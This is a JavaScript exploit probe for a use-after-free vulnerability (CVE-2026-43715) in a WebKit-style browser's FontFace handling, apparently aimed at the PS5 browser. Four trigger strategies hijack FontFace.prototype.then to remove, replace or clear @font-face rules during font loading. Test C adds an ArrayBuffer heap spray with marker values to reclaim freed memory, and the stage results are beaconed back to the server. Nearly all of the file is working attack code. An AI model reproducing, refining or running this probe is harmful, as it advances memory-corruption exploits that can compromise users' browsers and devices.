// p448-fontface-uaf-v2.js — CVE-2026-43715 targeted UAF probe
// V445 CONFIRMED: thenable getter fires with local('Arial') on PS5.
// This probe targets the ACTUAL UAF condition:
//   iterateClients copies m_clients to Vector<Ref<Client>>
//   Getter must cause a client to become disconnected/freed
//   Next iteration hit on disconnected client → UAF
//
// Three trigger strategies:
// A: Replace @font-face rule (same family) during getter → addFontFaceRule → remove old → adopt
// B: Remove style + add new style + force layout during getter
// C: Multiple @font-face rules → multiple CSSFontFace objects → cross-face disconnect
(function() {
    var RUN = 'p448-' + Date.now().toString(36);
    function B(stage, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + stage + '/' + RUN, false);
            x.send(body || '');
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);
    if (typeof FontFace === 'undefined') { B('DEAD', 'NO-FONTFACE'); return; }

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Replace @font-face with same family during getter
    // ═══════════════════════════════════════════════════════════════
    // When addFontFaceRule finds existing face with same descriptor:
    //   CSSFontFaceSet::remove(oldFace) → removeClient on oldFace
    //   FontFace::adopt(newBacking) → removeClient on oldBacking
    // This removes clients from the CSSFontFace being iterated.

    try {
        // Create CSS @font-face with local('Arial')
        var styleA = document.createElement('style');
        styleA.id = 'sfA';
        styleA.textContent = "@font-face { font-family: 'p448a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        // Find the FontFace
        var faceA = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === 'p448a') {
                faceA = e.value;
                break;
            }
        }

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            B('A-FOUND', 'status=' + faceA.status);

            var thenA = 0;
            var aErr = '';
            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    // REPLACE: remove old style, add new one with same family
                    var old = document.getElementById('sfA');
                    if (old) old.remove();

                    var newStyle = document.createElement('style');
                    newStyle.id = 'sfA2';
                    newStyle.textContent = "@font-face { font-family: 'p448a'; src: local('Arial'); font-weight: bold; }";
                    document.head.appendChild(newStyle);
                    document.body.offsetHeight; // force rebuild
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceA.load(); } catch(e) { aErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-RESULT', JSON.stringify({
                thenFired: thenA,
                err: aErr,
                status: faceA.status,
                sfAExists: !!document.getElementById('sfA'),
                sfA2Exists: !!document.getElementById('sfA2')
            }));

            // Check if face is still valid
            try {
                B('A-POST', JSON.stringify({
                    family: faceA.family,
                    status: faceA.status,
                    fontsSize: document.fonts.size
                }));
            } catch(e) { B('A-POST-ERR', e.message.slice(0,60)); }
        }
    } catch(e) { B('A-ERR', e.message.slice(0,80)); }

    // ═══════════════════════════════════════════════════════════════
    // TEST B: Multiple @font-face rules, remove ALL during getter
    // ═══════════════════════════════════════════════════════════════
    // Create 3 font-face rules. During getter: remove all style elements.
    // Multiple CSSFontFace objects → multiple iteration paths.

    try {
        for (var bi = 1; bi <= 3; bi++) {
            var sb = document.createElement('style');
            sb.id = 'sfB' + bi;
            sb.textContent = "@font-face { font-family: 'p448b" + bi + "'; src: local('Arial'); }";
            document.head.appendChild(sb);
        }
        document.body.offsetHeight;

        // Use an element that references ALL three fonts
        var testDiv = document.createElement('div');
        testDiv.id = 'b-test';
        testDiv.style.fontFamily = "'p448b1', 'p448b2', 'p448b3', serif";
        testDiv.textContent = 'Font test ABCDEFGHIJKLMNOP';
        document.body.appendChild(testDiv);
        document.body.offsetHeight;

        // Find first face
        var faceB = null;
        var it2 = document.fonts.values();
        var e2;
        while (!(e2 = it2.next()).done) {
            if (e2.value.family.replace(/['"]/g, '').indexOf('p448b') === 0) {
                faceB = e2.value;
                break;
            }
        }

        if (!faceB) { B('B-DEAD', 'NO-FACE'); }
        else {
            B('B-FOUND', 'family=' + faceB.family + ',status=' + faceB.status);

            var thenB = 0;
            var bErr = '';
            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    // Remove ALL font-face styles
                    for (var ri = 1; ri <= 3; ri++) {
                        var rel = document.getElementById('sfB' + ri);
                        if (rel) rel.remove();
                    }
                    // Also remove the test div
                    var td = document.getElementById('b-test');
                    if (td) td.remove();
                    document.body.offsetHeight;
                } catch(e) { bErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceB.load(); } catch(e) { bErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('B-RESULT', JSON.stringify({
                thenFired: thenB,
                err: bErr,
                fontsSize: document.fonts.size
            }));
        }
    } catch(e) { B('B-ERR', e.message.slice(0,80)); }

    // ═══════════════════════════════════════════════════════════════
    // TEST C: GC + AB spray after client disconnect
    // ═══════════════════════════════════════════════════════════════
    // Same as A, but after getter: heavy GC + spray to reuse freed memory
    // Then access the old face object to trigger UAF read

    try {
        var styleC = document.createElement('style');
        styleC.id = 'sfC';
        styleC.textContent = "@font-face { font-family: 'p448c'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var faceC = null;
        var it3 = document.fonts.values();
        var e3;
        while (!(e3 = it3.next()).done) {
            if (e3.value.family.replace(/['"]/g, '') === 'p448c') {
                faceC = e3.value;
                break;
            }
        }

        if (!faceC) { B('C-DEAD', 'NO-FACE'); }
        else {
            var savedFace = faceC; // Hold ref to the FontFace wrapper
            var thenC = 0;
            var cErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                if (thenC > 1) return undefined;
                try {
                    // Remove style
                    var el = document.getElementById('sfC');
                    if (el) el.remove();

                    // Replace with new @font-face (same family) to trigger adopt
                    var newStyle = document.createElement('style');
                    newStyle.id = 'sfC2';
                    newStyle.textContent = "@font-face { font-family: 'p448c'; src: local('Arial'); font-style: italic; }";
                    document.head.appendChild(newStyle);
                    document.body.offsetHeight;

                    // Heavy GC + spray
                    var spray = [];
                    for (var i = 0; i < 50000; i++) { new ArrayBuffer(256); }
                    for (var j = 0; j < 500; j++) {
                        var ab = new ArrayBuffer(128);
                        var dv = new DataView(ab);
                        dv.setUint32(0, 0x41414141, true);
                        dv.setUint32(4, 0x42424242, true);
                        spray.push(ab);
                    }
                } catch(e) { cErr += e.message; }
                return undefined;
            }, configurable: true });

            try { savedFace.load(); } catch(e) { cErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('C-RESULT', JSON.stringify({
                thenFired: thenC,
                err: cErr
            }));

            // Now try to access the old face — if backing was freed, this is UAF
            try {
                B('C-POST', JSON.stringify({
                    family: savedFace.family,
                    status: savedFace.status,
                    display: savedFace.display,
                    weight: savedFace.weight,
                    style: savedFace.style
                }));
            } catch(e) { B('C-POST-ERR', e.message.slice(0,80)); }

            // Force another layout to trigger any deferred UAF
            try {
                var testC = document.createElement('div');
                testC.style.fontFamily = "'p448c'";
                testC.textContent = 'Test p448c font usage after disconnect';
                document.body.appendChild(testC);
                document.body.offsetHeight;
                B('C-LAYOUT', 'OK;offsetHeight=' + testC.offsetHeight);
            } catch(e) { B('C-LAYOUT-ERR', e.message.slice(0,80)); }
        }
    } catch(e) { B('C-ERR', e.message.slice(0,80)); }

    // ═══════════════════════════════════════════════════════════════
    // TEST D: document.fonts.clear() during getter
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleD = document.createElement('style');
        styleD.id = 'sfD';
        styleD.textContent = "@font-face { font-family: 'p448d'; src: local('Arial'); }";
        document.head.appendChild(styleD);
        document.body.offsetHeight;

        var faceD = null;
        var it4 = document.fonts.values();
        var e4;
        while (!(e4 = it4.next()).done) {
            if (e4.value.family.replace(/['"]/g, '') === 'p448d') {
                faceD = e4.value;
                break;
            }
        }

        if (!faceD) { B('D-DEAD', 'NO-FACE'); }
        else {
            var thenD = 0;
            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenD++;
                if (thenD > 1) return undefined;
                try {
                    // Nuclear: clear ALL fonts
                    document.fonts.clear();
                    // Remove all font-related styles
                    var el = document.getElementById('sfD');
                    if (el) el.remove();
                    document.body.offsetHeight;
                } catch(e) {}
                return undefined;
            }, configurable: true });

            try { faceD.load(); } catch(e) {}
            try { delete FontFace.prototype.then; } catch(e) {}

            B('D-RESULT', JSON.stringify({
                thenFired: thenD,
                fontsSize: document.fonts.size
            }));
        }
    } catch(e) { B('D-ERR', e.message.slice(0,80)); }

    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
